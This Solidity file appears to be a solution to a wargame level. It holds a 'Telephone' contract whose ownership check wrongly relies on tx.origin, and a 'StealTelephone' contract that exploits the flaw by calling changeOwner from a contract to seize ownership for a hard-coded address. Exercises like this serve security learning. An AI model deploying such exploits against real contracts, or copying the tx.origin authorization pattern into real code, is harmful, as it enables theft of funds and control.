pragma solidity ^0.6.0;

contract Telephone {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract StealTelephone {
    Telephone t;
    constructor() public {
        address taddr = 0x72D1873C603Fd94603609221bba64d7881b5Df11;
        address myAddr = 0xafe8d48DeFC7B96912C638C8900CB71dDB1acEC4;
        t = Telephone(taddr);
        t.changeOwner(myAddr);
    }
}
